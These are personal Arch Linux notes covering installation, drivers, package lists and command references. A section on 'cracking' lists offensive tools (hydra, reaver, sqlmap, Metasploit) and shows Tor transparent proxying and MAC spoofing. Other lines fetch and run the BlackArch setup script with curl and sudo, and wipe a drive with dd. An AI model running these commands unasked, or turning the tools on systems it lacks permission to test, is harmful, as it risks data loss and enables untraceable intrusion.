# From Beginning To The End
# Arch Linux


# 1. Installation
    # see ArchWiki at https://wiki.archlinux.org/
    ## integrity check
        # download ISO-file and GPG-signature (check it with PGP fingerprint) from https://www.archlinux.org/download/
        pacman-key -v archlinux-<version>-x86_64.iso.sig # to verify the ISO image using the signature before installation
    # boot
    ## Internet connection
        wifi-menu # for wireless connection
        dhcpcd # for wired connection
    ## disk partitioning
        ### common
            lsblk # get list of disks
            lsusb # get list of usb devices
            # use cfdisk, fdisk or gdisk
            # create BIOS partition (2 MiB) for BIOS MBR (if 512 B for MBR isn't enough)
            # create BIOS partition (bios_grub flag, 2 MiB) for BIOS GPT (if 512 B for MBR isn't enough)
            # create EFI partition (/boot/efi, EFI type, 256 MiB, FAT32) for UEFI GPT
            # you can also create EFI partition in BIOS MBR partitioning and BIOS GPT for ability to migrate to UEFI GPT
            # you can also create BIOS partition in UEFI GPT partitioning for ability to BIOS Legacy boot
            # create swap ([SWAP], linux swap type, RAM size, optional) and root (/, linux type) partitions
            mkfs.ext4 /dev/sdXY # where sdXY is partition for linux
        ### hybrid UEFI GPT + BIOS GPT/MBR boot
            # create GPT partition table (ALL DATA WILL BE LOST)
            # create partitions: a BIOS boot partition (2 MiB, no FS, bios_grub flag), an EFI System partition (256 MiB, FAT32), your data partitions
            gdisk # enter 'r', 'h', '1 2 3', 'N', '', 'N', '', 'N', '', 'Y', 'x', 'h', 'w', 'Y'
            mkfs.fat -F32 /dev/sdX2
            mkfs.ext4 /dev/sdX3
    ## mounting root filesystem
        mount /dev/sdXY /mnt
    ## setting up swap (optional)
        ### as file
            dd if=/dev/zero of=/mnt/swapfile bs=1MiB count=<RAM_size_in_MiB> status=progress && sync
            # use "dd if=/dev/zero of=/mnt/swapfile bs=1MiB count=<additional_size_in_MiB> oflag=append conv=notrunc status=progress && sync"
            chmod 600 /mnt/swapfile
            mkswap /mnt/swapfile
            swapon /mnt/swapfile
        ### as partition
            mkswap /dev/sdXZ # where sdXZ is partition for linux swap
            swapon /dev/sdXZ
    ## installing packages
        nano /etc/pacman.conf # decomment "[multilib]" and "Include = /etc/pacman.d/mirrorlist"
        nano /etc/pacman.d/mirrorlist # move the server nearest you to the top
        pacman -Syy
        pacstrap /mnt linux linux-firmware linux-headers base base-devel multilib-devel arch-install-scripts net-tools dhcpcd networkmanager dialog iw wpa_supplicant
        # install optional dependencies for installed packages
    ## generating filesystem table file
        genfstab -U /mnt >> /mnt/etc/fstab
    ## chrooting
        arch-chroot /mnt
    ## setting up pacman
        nano /etc/pacman.conf # decomment "[multilib]" and "Include = /etc/pacman.d/mirrorlist"
        pacman -Syy pacman-mirrorlist pacman-contrib
        nano /etc/pacman.d/mirrorlist.pacnew # move the server nearest you to the top
        rankmirrors -n <number_of_uncommented_servers> /etc/pacman.d/mirrorlist.pacnew > /etc/pacman.d/mirrorlist
    ## locale settings
        nano /etc/locale.gen # decomment needed locales (en_US.UTF-8, uk_UA.UTF-8)
        locale-gen
        loadkeys us
        timedatectl set-ntp true
        ln -sf /usr/share/zoneinfo/<region>/<city> /etc/localtime
        hwclock --systohc
    ## host settings
        nano /etc/hostname # write your host name
        nano /etc/hosts <# write the following
            127.0.0.1 localhost
            ::1 localhost
            127.0.1.1 <hostname>.localdomain <hostname> # or static ip adress
        #>
    ## make initramfs image
        mkinitcpio -p linux
    ## protect superuser
        passwd <password> # set password for root user
    ## installing bootloader
        exit
        pacman -S grub efibootmgr os-prober
        ### common
            # /dev/sdX where X is last symbol
            grub-install --target=i386-pc --boot-directory=/boot --recheck --debug <disc_device> # for BIOS MBR
            mount <EFI_partition> /mnt/boot/efi/
            grub-install --target=x86_64-efi --efi-directory=/boot/efi/ --bootloader-id=GRUB --removable --recheck --debug # for UEFI GPT
            nano /etc/grub.d/40_custom <# type next for Windows 7 on BIOS and Windows 10 on UEFI
                menuentry "Windows XP/7" {
                    chainloader (hd0,3)+1 # if Windows is on /dev/sda3
                }
                menuentry "Windows 10" {
                    insmod part_gpt
                    insmod fat
                    insmod ntfs
                    insmod chain
                    set root=(<disk>,<EFI_partition>)
                    chainloader (${root})/EFI/Microsoft/Boot/bootmgfw.efi
                }
            #>
            # DO NOT EDIT /boot/grub/grub.cfg
        ### hybrid UEFI GPT + BIOS GPT/MBR boot
            grub-install --target=x86_64-efi --efi-directory=/boot/efi/ --bootloader-id=GRUB --removable --recheck --debug
            grub-install --target=i386-pc --boot-directory=/boot/ --recheck --debug <disc_device>
            grub-install --target=i386-pc --boot-directory=/boot/ --recheck --debug <root_partition>
        ### setup GRUB
            arch-chroot /mnt
            nano /etc/default/grub <# configure for your needs
                GRUB_DEFAULT=<default_lable_in_menu_starts_from_0>
                GRUB_TIMEOUT=<timeout>
                GRUB_GFXMODE=<width>x<height>x<depth> # graphic resolution
            #>
        ### GRUB password
            grub-mkpasswd-pbkdf2 # get hash of password
            nano /etc/grub/grub.cfg <# write the following
                set superusers="<username>"
                password_pbkdf2 <username> <pbkdf2_of_password>
            #>
        grub-mkconfig -o /boot/grub/grub.cfg
    ## reboot
        exit # from arch-chroot
        umount -R /mnt
        reboot
#


# 2. Setting up
    ## adding a user
        useradd -m <user>
        passwd <user>
        nano /etc/sudoers # add "<user> ALL=(ALL) ALL" to give user privileged rights
    ## graphical environment
        ### graphical server
            #### Xorg
                pacman -S choose xf86-video-fbdev xf86-video-intel xf86-video-amdgpu xf86-video-nouveau
                pacman -S xorg xorg-xinit
            #### Wayland
                pacman -S wayland
        ### desktop environment
            #### KDE Plasma
                pacman -S plasma plasma-wayland-session
                pacman -S kde-applications # if you need KDE applications
                pacman -S konsole ark dolphin filelight # if not installed yet
                pacman -S powerdevil plasma-nm plasma-browser-integration kwalletmanager kaccounts-providers packagekit-qt5 discover kmix spectacle kdeconnect
            # you can also use another desktop environment like Xfce, Gnome or window manager like Openbox instead of KDE Plasma
        #### SDDM
            pacman -S sddm sddm-kcm
            systemctl enable --now sddm
            nano /etc/sddm.conf <# write the following
                [General]
                Numlock=on
            #>
            # you can also use another display manager like LightDM, GDM or do without it
    ## security
        pacman -S iptables
        systemctl enable --now iptables
        ### microcode
            pacman -S intel-ucode amd-ucode
            grub-mkconfig -o /boot/grub/grub.cfg
    ## graphics and sound
        ### Nvidia
            pacman -S nvidia nvidia-utils lib32-nvidia-utils nvidia-settings opencl-nvidia lib32-opencl-nvidia opencl-headers # or "nvidia-390xx-dkms" (or "nvidia-340xx-dkms') instead of "nvidia" for unsupported graphics cards
            #### Optimus Manager
                optimus-manager # install from AUR
                # no Wayland support
                nano /etc/sddm.conf # comment "DisplayCommand" and "DisplayStopCommand"
                # you can also add "optimus-manager.startup=<mode>" to kernel parameters
                systemctl enable optimus-manager.service # and reboot
                optimus-manager --switch <intel|nvidia|hybrid|auto> # switch graphics card
                optimus-manager --set-startup <intel|nvidia|hybrid|auto> # switch graphics card on startup
                ##### GUI
                    pacman -S bbswitch acpi_call
                    optimus-manager-qt # install from AUR
                    # setup optimus-manager-qt to use bbswitch as switching method
            #### Nvidia PRIME
                pacman -S nvidia-prime
                prime-run <program>
        ### Intel
            pacman -S xf86-video-intel libva-intel-driver libva # install Mesa
            pacman -S vulkan-intel # Vulkan
        ### AMD
            pacman -S xf86-video-amdgpu # install Mesa
            pacman -S vulkan-radeon lib32-vulkan-radeon vulkan-mesa-layer # Vulkan
        ### libs
            pacman -S mesa lib32-mesa mesa-demos mesa-utils opengl-man-pages libva-mesa-driver lib32-libva-mesa-driver mesa-vdpau lib32-mesa-vdpau opencl-mesa # Mesa
            pacman -S vulkan-icd-loader lib32-vulkan-icd-loader vulkan-headers vulkan-validation-layers vulkan-tools # Vulkan
            pacman -S openal # OpenAL
        ### sound
            pacman -S alsa-lib alsa-utils
            pacman -S pulseaudio pavucontrol paprefs pamixer pulseeffects
    ## input devices
        ### keyboard
            pacman -S kbd terminus-font
            nano /etc/vconsole.conf <# write the following
                LOCALE="uk_UA.UTF-8" # you can also set "uk_UA.utf-8" and "uk_UA.utf8"
                LANG="uk_UA.UTF-8"
                KEYMAP="us"
                KEYMAP="ua-cp1251"
                FONT="ter-v16n" # or ter-v16b
                CONSOLEMAP=""
                USECOLOR="yes"
                HARDWARECLOCK="UTC"
                TIMEZONE="Europe/Kiev"
            #>
            nano /etc/locale.conf <# write the following
                LANG="uk_UA.UTF-8" # LANG sets all LC_* variables (LC_ALL sets LANG and LC_*, but you can't set it here)
                LC_MESSAGES="en_US.UTF-8"
            #>
            # go to system settings and set language in input devices section
        ### mouse
            pacman -S gpm libinput
            gpm -m <mouse_device> -t <type> # for one-time execution
            nano /etc/conf.d/gpm <# write the following
                GPM_ARGS="-m <mouse_device> -t <type>"
            #>
            systemctl enable --now gpm.service
        ### touchpad
            pacman -S xf86-input-synaptics
            nano /etc/X11/xorg.conf.d/50-synaptics.conf <# write the following
                Section "InputClass"
                Identifier "touchpad catchall"
                Driver "synaptics"
                MatchIsTouchpad "on"
                MatchDevicePath "/dev/input/event*"
                    Option "TapButton1" "1"
                    Option "TapButton2" "2"
                    Option "TapButton3" "3"
                EndSection
            #>
    ## laptop
        ### HDD shock protection
            #### Hewlett-Packard/Compaq
                hpfall-git # install from AUR
                nano /etc/conf.d/hpfall <# write the following
                    DEVICE=<HDD_device>
                #>
                systemctl enable --now hpfall
            #### Lenovo/IBM ThinkPad
                pacman -S tp_smapi hdapsd
                nano /etc/modprobe.d/modprobe.conf # configure "invert" option
                nano /etc/systemd/system/hdapsd.service.d/sensitivity.conf # configure sensivity
    ## digital signature utilities
        ### GnuPG (PGP)
            pacman -S gnupg
        ### SSL
            pacman -S openssl
        ### password managers
            pacman -S seahorse
            Enpass # install from AUR (enpass-bin) # or Bitwarden (bitwarden-bin)
    ## software development kit
        ### languages
            pacman -S gcc clang
            pacman -S rust
            pacman -S nasm binutils
            pacman -S python python-pip
            pacman -S ghc gcc-ada erlang perl clisp lua
            pacman -S android-tools android-udev
        ### build systems
            pacman -S ninja make cmake scons gradle
        ### editors
            pacman -S notepadqq # Qt clone of Notepad++
            pacman -S ghex hexedit
        ### IDEs
            pacman -S vim emacs
            clion # install from AUR
            pacman -S qtcreator
            pacman -S code # or install from AUR (visual-studio-code-bin)
            pacman -S arduino arduino-docs arduino-avr-core
            pacman -S processing
        ### utilities
            pacman -S binutils gdb valgrind perf strace trace-cmd
            pacman -S cppcheck pahole cscope # C++ only
            pacman -S git
            pacman -S ccache distcc
            oclint # install from AUR
        ### GameDev
            Unreal Engine 4 # install from AUR (unreal-engine)
            Unity Hub # install from AUR (unityhub)
            pacman -S godot
            Serious Engine # install from AUR (serious-engine-git)
            pacman -S blender
            PhysX # install from AUR (physx)
        ### databases
            #### SQLite
                pacman -S sqlite3
                sqlite3 <database_file>
            #### MySQL
                pacman -S mariadb
                sudo mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql
                sudo systemctl enable --now mariadb.service
                sudo mysql_secure_installation
            #### PostgreSQL
                pacman -S postgresql
                sudo su - postgres -c "initdb --locale uk_UA.UTF-8 -E UTF8 -D '/var/lib/postgres/data'"
                sudo chown -R postgres:postgres /var/lib/postgres/
                sudo systemctl enable --now postgresql
                createuser <username>
                psql -U <username> # "postgres" is database root username
        ### DevOps
            pacman -S jeankins
            teamcity # install from AUR
            pacman -S ansible puppet salt
            chef-workstation chef-client # install from AUR
            pacman -S vagrant
            pacman -S prometheus grafana
            pacman -S docker # enable and start service
            docker-swarm # install from AUR
            pacman -S kubectl
            rancher/cattle # download from GitHub
            pacman -S nginx
            Eclipse Papyrus # install from AUR (papyrus)
            pacman -S doxygen
    ## other
        pacman -S htop glances tiptop perf iotop strace lsof
        pacman -S mc
        pacman -S tmux
        pacman -S util-linux gdisk parted gparted
        pacman -S curl wget
        pacman -S w3m links
        pacman -S cron # run service
        pacman -S thunderbird notmuch
        pacman -S transmission-qt ktorrent
        pacman -S translate-shell # usage trans
        pacman -S youtube-dl youtube-viewer
        pacman -S playonlinux
        pacman -S newsboat
        pacman -S chntpw flashrom
        toilet # install from AUR
        pacman -S cmatrix
        ### secure erasing
            pacman -S coreutils # for shred
            pacman -S wipe
            secure-delete # install from AUR
        ### web
            pacman -S chromium firefox
        ### messangers
            pacman -S telegram-desktop
            viber # install from AUR
            pacman -S discord
            slack-desktop # install from AUR
        ### media
            spotify # install from AUR
            pacman -S vlc kaffeine # for multimedia
            pacman -S eog # for pictures
            # you can use AIMP with WINE
            #### audio
                pacman -S jack2 qjackctl
                usermod -a -G audio <user>
                qjackctl # setup
                linux-rt-lts # install from AUR
                nano /etc/default/grub # add "threadirqs" to linux-rt kernel parameters
                pacman -S lmms ardour guitarix # LMMS looks like FL Studio and Guitarix looks like Guitar Rig for Windows
            #### graphics
                pacman -S convert kolourpaint gimp
            #### ffmpeg
                pacman -S ffmpeg v4l2loopback-dkms
        ### bluetooth
            pacman -S pulseaudio-alsa bluez bluez-libs bluez-utils bluedevil pulseaudio-bluetooth # run bluetooth daemons
            bluez-firmware # install from AUR
            nano /etc/pulse/default.pa # add "tsched=0" after "load-module module-udev-detect"
        ### iOS
            pacman -S libimobiledevice usbmuxd # run usbmuxd.service
            ifuse # install from AUR
            idevicepair pair # pair connected unlocked iOS device
            ifuse -o allow_other <mount_directory> # mount iOS device
        ### emulators
            pacman -S wine wine-mono wine-gecko # for Windows
            pacman -S dosbox # for DOS
            pacman -S dolphin-emu # for Nintendo Wii
            yuzu # install from AUR (yuzu-mainline-git) # for Nintendo Switch
        ### Java
            pacman -S java-runtime-common java-environment-common jdk-openjdk
        ### Office
            #### WPS Office
                wps-office # install from AUR # or LibreOffice or Apache OpenOffice
                ttf-wps-fonts # install from AUR
            #### Libre Office
                pacman -S libreoffice-still
        ### science and education
            pacman -S geogebra # mathematics
            pacman -S stellarium celestia # astronomy
            pacman -S step # physics
            qucs # install from AUR # electronics
            pacman -S python-biopython # bioinformatics
            pacman -S kalzium # chemistry
            avogadro # install from AUR # chemistry
        ### Remote Desktop
            pacman -S remmina
            teamviewer # install from AUR # run teamviewerd.service
            parsec # install from AUR (parsec-bin)
        ### games
            #### Steam
                pacman -S steam
                SteamOS compositor # install from AUR (steamos-compositor-plus)
                steamcmd # install from AUR
            pacman -S dwarffortress
            pacman -S bsd-games
            pacman -S aisleriot
            pacman -S armagetronad
            pacman -S rogue zangband nethack
            nsnake bastet myman ninvaders # install it all from AUR
            nudoku-git 2048-rs # install it all from AUR
        ### hamachi
            logmein-hamachi # install from AUR
            nano /var/lib/logmein-hamachi/h2-engine-override.cfg # add "Ipc.User <user>"
            systemctl enable --now logmein-hamachi
            hamachi ?
    ## advanced networking
        ### SSH
            pacman -S openssh sshfs fail2ban
        ### OpenVPN
            pacman -S openvpn easy-rsa
            pacman -S networkmanager-openvpn
        ### network management
            # you can use Endian Firewall, Kerio Control, ClearOS as firewall
            # you can use zabbix, icinga, monitorix as monitoring panel
            # you can use cPanel, ajenti, aapanel as control panel
            # you can use dnsmasq as light DHCP, DNS and TFTP server
        ### security
            pacman -S fwbuilder
            pacman -S clamav rkhunter lynis # add this jobs to cron
            snort # install from AUR
        ### DHCP
            pacman -S dhcp
        ### DNS
            pacman -S unbound expat
        ### FTP
            pacman -S vsftpd
            pacman -S filezilla
        ### EMail
            pacman -S postfix exim clamav spamassassin
        ### Samba
            pacman -S samba smbclient
        ### Windows Active Directory integration
            # install samba
            pacman -S openldap ntp krb5
        ### DFS
            pacman -S glusterfs ceph
        ### archiso
            pacman -S archiso
        ### emulators
            GNS3 # install from AUR (python-aiohttp-cors-gns3 python-yarl-gns3 gns3-gui gns3-server dynamips ubridge)
            Cisco Packet Tracer # install from AUR (packettracer)
    ## virtualization
        ### Qemu
            pacman -S qemu qemu-arch-extra qemu-block-gluster qemu-block-iscsi qemu-block-rbd
            #### Hypervisors
                ##### KVM
                    LC_ALL=C lscpu | grep Virtualization # if nothing is displayed your processor does not support hardware virtualization
                    grep -E "vmx|svm" /proc/cpuinfo # if nothing is displayed your processor does not support hardware virtualization
                    zgrep CONFIG_KVM /proc/config.gz # if KVM has 'y' or 'm' mark your kernel supports KVM
                    modprobe kvm kvm_amd kvm_intel
                ##### Xen
                    # KVM needed
                    xen xen-docs xe-guest-utilities grub-xen-git # install from AUR
                    nano /etc/xen/grub.conf # add "dom0_mem=<amount_of_RAM>,max:<maximum_amount_of_RAM>" to XEN_HYPERVISOR_CMDLINE if you need
                    grub-mkconfig -o /boot/grub/grub.cfg
                    ip link add name xenbr0 type bridge
                    ip link set xenbr0 up
                    ip link set <bridged_interface> master xenbr0
                    systemctl enable xenstored xenconsoled xendomains xen-init-dom0
                    # reboot
                    xl list # there must be dom0 host runned
            #### GUI
                ##### virt-manager
                    pacman -S libvirt virt-manager
                    pacman -S iptables-nft dnsmasq
                    nano /etc/libvirt/qemu.conf # decomment user and group variables if permission error happens
                ##### aqemu
                    aqemu # install from AUR
                    # for Internet access add nic and user network devices
                    # you can use linux KVM hypervisor or standart TCG accelerator in QEMU
    ## cracking and network tools
        ### sniffing and not only
            pacman -S scapy # or python-scapy
            pacman -S wireshark-qt
            burpsuit # install from AUR # needs jre11-openjdk
        ### Kali tools
            pacman -S aircrack-ng-scripts
            pacman -S net-tools
            pacman -S reaver
            crunch # install from AUR
            cupp # install from AUR (cupp-v3)
            pacman -S hydra
            pacman -S nmap
        ### web scanners
            w3af nessus arachni dirb # install from AUR
            pacman -S sqlmap
        ### tor
            pacman -S tor # run tor daemon
            #### proxychains
                pacman -S proxychains-ng
                nano /etc/proxychains.conf # decomment "dynamic_chain" and comment "strict_chain", change "socks4" to "socks5"
                proxychains <program> # usage
            #### torify system
                nano /etc/tor/torrc <# write the following
                    TransPort 9040
                    DNSPort 9053
                    AutomapHostsOnResolve 1
                    AutomapHostsSuffixes .exit,.onion
                    ControlPort 9051
                #>
                systemctl restart tor
                sleep 5
                iptables -t nat -A OUTPUT -p udp -m udp --dport 53 -j REDIRECT --to-ports 9053
                iptables -t nat -A OUTPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -j REDIRECT --to-ports 9040
            #### view tor circuit
                pip install carml
                carml monitor -v -o
        ### IPv6
            miredo # install from AUR # run miredo daemon
        ### MAC address changing
            pacman -S macchanger
        ### Metasploit Project
            # install PostgreSQL and Ruby
            #### Ruby configuration for Metasploit
                nano ~/.profile # add '"'"'" PATH="$PATH:$(ruby -e 'puts Gem.user_dir')/bin" "'"'"'
                mkdir ~/rubygems
                cd ~/rubygems
                gem install bundler
                bundle config path ~/rubygems/.gem
                bundle init
                bundle install
                bundle update --bundler
                source ~/.rvm/scripts/rvm
            #### PostgreSQL configuration for Metasploit
                su postgres
                createuser msf -P -S -R -D
                createdb -O msf msf
                exit
            #### MetaSploit Framework
                # you can install it from offical repository https://github.com/rapid7
                pacman -S metasploit # or from arch repositories
                msfdb init
                msfconsole
                db_connect msf@msf
                db_rebuild_cache
                db_status
                exit
        ### BlackArch
            curl -O https://blackarch.org/strap.sh # download the script
            echo 46f035c31d758c077cce8f16cf9381e8def937bb strap.sh | sha1sum -c # verify the script signature
            chmod +x strap.sh # make the script executable
            sudo sh strap.sh # execute the script
            pacman -Syu # update repositories' info
            sudo pacman -Sgg | grep blackarch | cut -d' ' -f2 | sort -u # list packages from the BlackArch repository
            sudo pacman -Sg | grep blackarch # list package groups from the BlackArch repository
            sudo pacman -S blackarch-<category> # install specified package category from the BlackArch repository
            sudo pacman -S blackarch # install all packages from the BlackArch repository
#


# 3. Using
    ## Basic GNU/Linux commands
        ls, cd
        mkdir, rmdir
        rm
        ln
        chown, chmod
        cat, grep, less
        head, tail
        diff, wc
        locate, find, sed, sort
        du, tree
        touch
        echo, printf
        pwd
        date, cal
        jobs, fg, bg, kill
        write, mesg, talk, lpr
        exec
        factor, expr
        dd, truncate
        # all filesystem objects (common files, directories, devices, sockets, etc.) are file descriptors
        # you can use ctrl+c, ctrl+d, ctrl+z and other hotkeys
        # you can redirect I/O/E streams with >, >>, < or merge them with 2>&1, 1>>&2, etc. (0 - I, 1 - O, 2 - E)
        # you can use autocompletion with TAB
        # you can use <space><command> instead of <command> to not write history
        # you can use !<number> to execute <number>'th command from history
        # you can use ctrl+alt+delete to reboot the machine
        # you can use ctrl+alt+break to terminate Xorg server
        # you can use alt+SysRq+<key> to send a low-level command to the kernel
        ### run application regardless of the console
            <application> &
        ### show filtered command output
            <application> | grep <pattern>
        ### login as another user
            sudo su # login as root
            sudo su <user> # login as <user>
        ### text editors
            nano <file> # tiny text editor
            cat <file> # print text to console
            od <file> # print symbols to console
        ### archiving tools
            zip
            unzip
            gzip
            gunzip
            bzip2
            bunzip2
            tar
            ar
    ## informational and management tools
        help # help
        man <command> # an interface to the system reference manuals
        info <command> # Stand-alone GNU Info
        top # system status and process info
        htop # system status ans process management
        pstree # tree of processes
        ps # currently running processes
        glances # an eye on your system
        fuser # network using by processes
        free # RAM usage
        df # disk usage
        hdparm # hard drive parameters
        uname # system information
        uptime # system uptime
        iotop # I/O info
        lsblk # list of hard disks
        blkid # partitions' ids
        lsusb # list of usb devices
        lscpu # info about processors
        lspci # list of pci devices
        lstopo # host topology
        dmidecode # DMI table decoder
        vmstat # virtual memory statistics
        glxinfo # video driver info
        intel_gpu_top # display a top-like summary of Intel GPU usage
        radeontop # tool to show GPU utilization
        nvidia-smi # NVIDIA System Management Interface program
        nvtop # interactive GPU process viewer
        upower # UPower command line tool
        w # shows who is logged in on and what they are doing
        who # shows who is logged in and from where
        last # shows login chronology
        lastlog # shows users' login time
        dmesg # print or control the kernel ring buffer
        which <command> # shows command executable file path
        cat /etc/services # shows used by services ports
        touch <file> # change file timestamps to current moment
        time <program> # time of program running
        debugfs # ext2/ext3/ext4 filesystem debugger
        ext4undelete ntfsundelete # undelete files
        cat less tail head cut paste join split grep sed uniq sort nl wc # text processing
        tee xargs # output redirecting
        top ps bg fg kill killall pgrep pkill pwait nice renice # process control
        useradd userdel usermod passwd groupadd groupdel chown chgrp chmod # user moderation
        lvm lvs lvcreate lvremove vgs vgcreate vgremove # LVM
        losetup # loopback device setup
        ### network info
            ip
            iw
            ping
            traceroute, tracepath
            arp
            route
            netstat
            ss
            dig, nslookup, host
            tcpdump
            dnsmap
            wol
        ### software development info
            objdump -D <executable_file> # full disassembling
            objdump -p <executable_file> # list dynamic libraries dependencies
            ldd <executable_file> # list dynamic libraries dependencies
            readelf -a <executable_file> # show ELF-file information
            nm <executable_file> # list symbols
            strings # print the strings of printable characters in files
    ## ArchLinux package manager utilities
        man pacman
        pacman -Syu # upgrade packages
        pacman -Rns $(pacman -Qtdq) # delete unused packages
        pacman -Sc # delete cache
        pacman -U <protocol>://<package> # install package from remote non official repository
        pacman -Sw <package> # download package but not install
        pacman -Si <package> # information about package in remote database
        pacman -Qi <package> # information about package in local database
        ### installation from AUR
            # login as user
            git clone https://aur.archlinux.org/<package>.git
            cd <package>
            makepkg s
            # install required packages with "sudo pacman -Sy --asdeps <packages>"
            sudo pacman -U <package> # <package> is name of arhive <package>-<vesrion>.tar.xz (or .tar.gz)
            # now you can remove this directory
            #### list packages installed localy
                pacman -Qm
            #### AUR helpers
                rua # install from AUR
                aurutils # install from AUR
                pacman -D --asexplicit <package> # to set package installation reason to explicit if using AUR helpers
        ### downgrading packages
            nano /etc/pacman.d/mirrorlist <# replace with
                Server=https://archive.archlinux.org/repos/<year>/<mounth>/<day>/$repo/os/$arch
            #>
            pacman -Syyuu
    ## systemd system and service manager utilities
        systemctl # control the systemd system and service manager
        journalctl # query the systemd journal
        ### add a new systemd service
            nano /etc/systemd/system/<service_name>.service <# write the following
                [Unit]
                Description=<description>
                After=<previous_target>
                StartLimitIntervalSec=0

                [Service]
                Type=simple
                Restart=always
                RestartSec=1
                User=<user>
                ExecStart=<command_to_execute>

                [Install]
                WantedBy=multi-user.target
            #>
    ## add a new desktop entry
        nano /usr/share/xsessions/<entry_name>.desktop <# type next
            [Desktop Entry]
            Name=<name>
            Comment=<comment>
            Exec=<exec>
            TryExec=<tryexec>
            Icon=<icon>
            Type=<type>
        #>
        # use "/usr/share/wayland-sessions/" instead of "/usr/share/xsessions/" for Wayland
    ## run GUI application in KDE Plasma as root
        kdesu <application>
    ## run GUI application over ssh as root
        # enable X11 forwarding
        ssh <user>:<host> -Y
        sudo -E <application>
    ## run application in the separate X-Server
        ### 1st method
            startx <exe> -- :<virtual_monitor_number>
        ### 2nd method
            nano ~/runXapp.sh <# paste next
                cd <exe_dir>
                xinit <exe> -- :<virtual_display_number>
            #>
            sh runXapp.sh # common
            nano ~/runXappWine.sh <# paste next
                cd <exe_dir>
                WINEDEBUG=-all wine <exe>
            #>
            startx ~/runXappWine.sh -- :<virtual_display_number> # with WINE
    ## dd - convert and copy utility
        dd if=<iso_image> of=<usb_device> bs=<sector_size> count=<copy_size> status=progress && sync # copy iso image to usb device
        dd if=/dev/zero of=<device> status=progress && sync # wipe data on drive device, you can use /dev/random instead of /dev/zero
    ## ffmpeg
        modprobe v4l2loopback exclusive_caps=1 video_nr=<video_devices_numbers_comma_separated> card_label=<video_devices_names_comma_separated> timeout=16000
        ffmpeg -f x11grab -video_size <screen_resolution> -i $DISPLAY -vframes 1 <output_file_png> # take a screenshot
        ffmpeg -f x11grab -video_size <screen_resolution> -framerate <frames_per_second> -i $DISPLAY -c:v ffvhuff <output_file_mkv> # lossless screencast without audio
        ffmpeg -f x11grab -video_size <screen_resolution> -framerate <frames_per_second> -i $DISPLAY -f alsa -i default -c:v libx264 -preset ultrafast -c:a aac <output_file_mp4> # lossy screencast with audio
        ffmpeg -f v4l2 -video_size <camera_resolution> -i <video_device> -c:v libx264 -preset ultrafast <output_file_mp4> # record camera
        ffmpeg -f v4l2 -video_size <camera_resolution> -i <video_device> -f alsa -i default -c:v libx264 -preset ultrafast -c:a aac <output_file_mp4> # record camera and microphone
        ffmpeg -i <input_file> -c:v <output_video_codec> -c:a <output_audio_codec> <output_file> # convert media formats and codecs
        ffmpeg -f x11grab -framerate <frames_per_second> -video_size <screen_resolution> -i :0.0 -f v4l2 <video_device> # stream screen to video device
        ffmpeg -re -i <input_video_file> -map 0:v -f v4l2 <video_device> # stream video to video device
        while true; do ffmpeg -re -i <input_gif_file> -f v4l2 -vcodec rawvideo -pix_fmt yuv420p <video_device>; done # stream gif to video device
        ffmpeg -loop 1 -re -i <input_image_file> -f v4l2 -vcodec rawvideo -pix_fmt yuv420p <video_device> # stream image to video device
        ffplay <input_device_or_file> # watch input device or file
    ## cron
        nano /etc/crontab # enter "<minute> <hour> <day_of_month> <month> <day_of_week> <command_or_script>" (* to all, */n to every n, a,b to several)
    ## enable numlock at logon (deprecated)
        pacman -S numlockx
        nano ~/.bash_profile # add "numlockx &"
    ## suspending the system
        # does not work on linux-hardened
        nano /sys/power/image_size # set size of hibernation image (less if slower)
        ### swap partition
            nano /etc/default/grub # add "resume=<swap_partition>" in GRUB_CMDLINE_LINUX_DEFAULT
        ### swap file
            filefrag -v /swapfile | awk '$1=="0:" {print substr($4, 1, length($4)-2)}' # get swap file offset
            nano /etc/default/grub # add "resume=<swapfile_volume> resume_offset=<swapfile_offset>" in GRUB_CMDLINE_LINUX_DEFAULT
        grub-mkconfig -o /boot/grub/grub.cfg
        nano /etc/mkinitcpio.conf # in HOOKS add "resume" after "filesystems" if there is "base" but not "systemd", if you use UUID add "resume" after "udev"
        mkinitcpio -p linux
        nano /etc/systemd/logind.conf # configure to your needs
        systemctl restart systemd-logind.service # ALL SESSIONS WILL BE CLOSED
        reboot
        systemctl <power_state> # hibernate, or suspend, or suspend-then-hibernate, or hybrid-sleep
    ## mount the hard drive with permissions
        id # get your uid and gid
        <# permissions
            7 : read, write and execute
            6 : read and write
            5 : read and execute
            4 : read only
            3 : write and execute
            2 : write only
            1 : execute only
            0 : no permissions
            umask = abc (masks permissions), where a - for you, b - for users in your group, c - for another users
        #>
        mount <partition_device> <mount_directory> -t <file_system_type> -o rw,relatime,uid=<uid>,gid=<gid>,umask=<umask> # for example: mount /dev/sda1 /home/mountshare/d -t ntfs-3g -o rw,relatime,uid=1000,gid=1000,umask=007,windows_names
        nano /etc/fstab # edit for automatic mounting
        ### for multiple users
            useradd --create-home --system mountshare
            usermod -L mountshare
            usermod -a -G mountshare <user>
            chown mountshare:mountshare /home/mountshare/ -R
            chmod ug+rwx,o-rwx /home/mountshare/ -R
            # now mount disks to /home/mountshare/<mount_directory> with umask=007
    ## folder encryption (ecryptfs)
        pacman -S ecryptfs-utils keyutils
        modprobe ecryptfs # and reboot
        mkdir /home/<user>/encrypted/ # here is ciphered data storage
        mkdir /home/<user>/mounted/ # here is unciphered mounted data
        chown <user>:<user> /home/<user>/{encrypted,mounted}/ # if created by root
        mount -t ecryptfs /home/<user>/encrypted/ /home/<user>/mounted/ # setup the storage
        mount -t ecryptfs /home/<user>/encrypted/ /home/<user>/mounted/ -o ecryptfs_cipher=<cipher>,ecryptfs_key_bytes=<ebytes>,key=<passphrase> # now you can access to your encrypted directory
        cryptsetup # use it to setup encrypted devices
    ## silent boot
        ### GRUB 2
            grub-silent # install from AUR
            # reinstall GRUB
            nano /etc/default/grub <# write the following
                GRUB_TIMEOUT=0
                GRUB_HIDDEN_TIMEOUT=3
                GRUB_RECORDFAIL_TIMEOUT=$GRUB_HIDDEN_TIMEOUT
                GRUB_CMDLINE_LINUX_DEFAULT="quiet splash loglevel=3 rd.udev.log_priority=3 vt.global_cursor_default=0"
            #>
            setterm -cursor on >> /etc/issue
        ### Plymouth
            plymouth # install from AUR
            nano /etc/default/grub # set GRUB_CMDLINE_LINUX_DEFAULT to "quiet splash loglevel=3 rd.udev.log_priority=3 vt.global_cursor_default=0"
            setterm -cursor on >> /etc/issue
            # regenerate grub.cfg
